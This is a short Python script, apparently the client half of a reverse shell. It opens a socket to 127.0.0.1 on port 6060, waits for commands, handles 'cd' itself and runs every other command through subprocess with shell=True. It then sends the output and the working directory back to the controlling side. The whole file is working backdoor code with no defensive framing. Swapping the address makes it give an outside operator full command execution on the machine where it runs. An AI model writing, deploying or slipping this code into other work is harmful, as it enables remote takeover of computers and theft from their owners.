import os
import socket
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 6060

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("UTF-8") == "cd":
        os.chdir(data[3:].decode("UTF-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("UTF-8"), 
                               shell=True, 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "UTF-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)

#Close the connection
s.close()
